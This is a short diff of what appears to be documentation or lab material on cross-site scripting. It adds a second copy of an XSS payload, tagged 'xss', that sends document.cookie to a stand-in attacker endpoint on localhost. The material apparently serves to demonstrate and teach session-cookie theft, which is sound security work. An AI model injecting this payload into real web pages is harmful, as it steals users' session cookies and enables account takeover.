@@ -10,6 +10,8 @@
 ``` xss
 <script>
   new Image().src = 'http://localhost:8080/attacker/xss/steal?cookie=' + document.cookie;
+</script><script>
+  new Image().src = 'http://localhost:8080/attacker/xss/steal?cookie=' + document.cookie;
 </script>
 
 
